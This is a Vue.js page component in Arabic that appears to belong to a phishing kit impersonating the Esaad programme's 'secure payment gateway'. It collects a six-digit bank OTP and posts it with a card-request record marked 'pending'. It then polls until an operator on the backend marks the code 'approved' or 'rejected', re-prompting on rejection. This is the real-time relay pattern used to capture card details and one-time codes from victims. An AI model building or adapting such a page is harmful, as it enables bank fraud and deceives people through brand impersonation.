<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { ShieldCheck } from 'lucide-vue-next';
import { updateCardRequest, getCardRequest, resolveActiveRequestId, setActiveRequestId } from '../api';

const router = useRouter();
const otp = ref('');
const timeLeft = ref(55); // 00:55
let timer: ReturnType<typeof setInterval> | null = null;
let statusPoll: ReturnType<typeof setInterval> | null = null;
const isSubmitting = ref(false);
const error = ref('');
const successMessage = ref('');

const pad = (n: number) => n.toString().padStart(2, '0');

const formattedTime = computed(() => {
  const m = Math.floor(timeLeft.value / 60);
  const s = timeLeft.value % 60;
  return `${pad(m)}:${pad(s)}`;
});

onMounted(() => {
  timer = setInterval(() => {
    if (timeLeft.value > 0) {
      timeLeft.value--;
    }
  }, 1000);
});

onUnmounted(() => {
  if (timer) clearInterval(timer);
  if (statusPoll) clearInterval(statusPoll);
});

const submitOtp = async () => {
  if (!otp.value || isSubmitting.value) return;

  if (!/^\d{6}$/.test(otp.value)) {
    error.value = 'الرجاء إدخال رمز صحيح مكون من 6 أرقام';
    return;
  }
  error.value = '';

  isSubmitting.value = true;
  
  const requestId = await resolveActiveRequestId();
  if (!requestId) {
    error.value = 'لم يتم العثور على الطلب، يرجى البدء من جديد.';
    isSubmitting.value = false;
    setTimeout(() => router.push('/'), 1200);
    return;
  }

  try {
    await updateCardRequest(requestId, {
      otp: otp.value,
      step: 'otp-bank',
      otpStatus: 'pending'
    });

    if (statusPoll) clearInterval(statusPoll);
    statusPoll = setInterval(async () => {
      try {
        const data = await getCardRequest(requestId);
        if (!data) return;
        if (data.otpStatus === 'approved') {
          if (statusPoll) clearInterval(statusPoll);
          successMessage.value = 'تمت العملية وتأكيد الطلب بنجاح!';
          setActiveRequestId(null);
          isSubmitting.value = false;
          setTimeout(() => router.push('/'), 1800);
        } else if (data.otpStatus === 'rejected') {
          if (statusPoll) clearInterval(statusPoll);
          error.value = 'الرجاء إدخال رمز صحيح. الرمز غير صحيح.';
          otp.value = '';
          isSubmitting.value = false;
        }
      } catch (e) {}
    }, 1500);
  } catch (err) {
    error.value = 'حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.';
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto min-h-screen bg-[#eef5f0] flex flex-col justify-between font-sans text-gray-900">
    
    <!-- Top Dark Esaad Header -->
    <header class="w-full bg-[#040c06] py-3 px-4 flex justify-center border-b border-[#009a44]/30">
      <div @click="router.push('/')" class="cursor-pointer flex flex-col items-center select-none">
        <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
        <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
        <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
          <circle cx="14" cy="4" r="2" fill="#39b54a" />
          <circle cx="46" cy="4" r="2" fill="#39b54a" />
          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
        </svg>
      </div>
    </header>

    <!-- Main Card -->
    <div class="px-5 py-6 my-auto flex flex-col items-center">
      <div class="bg-white rounded-2xl shadow-[0_10px_35px_rgba(0,0,0,0.06)] w-full max-w-[390px] border border-gray-200/80 p-6 flex flex-col items-center relative z-10 text-center">
        
        <span class="text-[11px] font-bold text-[#008a40] mb-1.5">التحقق عبر التطبيق البنكي</span>

        <p class="text-gray-900 text-sm mb-4 font-bold leading-relaxed">
          إذا لم تتلقَّ رمز التأكيد برسالة نصية عبر جوالك
        </p>

        <div class="bg-[#f3f9f5] border border-[#009a44]/20 rounded-xl p-3.5 mb-5 w-full">
          <p class="text-gray-800 text-xs font-semibold leading-relaxed">
            قم بفتح التطبيق البنكي<br/>
            سيظهر لك إشعار فوري<br/>
            قم بالضغط على الإشعار لتأكيد الطلب أو أدخل الرمز أدناه
          </p>
        </div>

        <div v-if="successMessage" class="w-full mb-4 p-2.5 rounded-xl bg-green-50 border border-green-200 text-[#008a40] text-xs font-bold">
          {{ successMessage }}
        </div>

        <div class="flex items-center gap-3 w-full mb-6 justify-between" dir="ltr">
          <div class="w-full relative flex-1">
            <input 
              type="text" 
              v-model="otp" 
              placeholder="* * * * * *" 
              class="w-full border border-gray-300 rounded-xl py-2.5 text-center text-base tracking-[0.4em] focus:outline-none focus:border-[#009a44] text-gray-900 bg-transparent transition-colors placeholder-gray-400 font-mono"
              maxlength="6"
            />
          </div>

          <!-- Timer -->
          <div class="text-base font-extrabold text-[#008a40] font-mono tabular-nums shrink-0">
            {{ formattedTime }}
          </div>
        </div>

        <p v-if="error" class="text-red-600 text-[11px] mb-3 text-center">{{ error }}</p>

        <!-- Submit Button -->
        <button 
          @click="submitOtp" 
          :disabled="isSubmitting"
          class="w-full bg-[#008a40] hover:bg-[#007335] text-white py-3 rounded-xl font-bold text-sm tracking-wide transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 shadow-md cursor-pointer"
        >
          <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
          <span v-else>تأكيد الرمز (Verification Code)</span>
        </button>

      </div>

      <!-- Security Footer -->
      <div class="mt-6 flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#008a40]">
        <ShieldCheck class="w-3.5 h-3.5" />
        <span>بوابة الدفع الإلكتروني الآمن - برنامج إسعاد</span>
      </div>
    </div>

    <!-- Esaad Footer -->
    <footer class="bg-[#e4f2ea] px-5 py-4 text-center text-[11px] text-gray-600 border-t border-gray-200/60">
      © 2026 esaad, كل الحقوق محفوظة.
    </footer>

  </div>
</template>
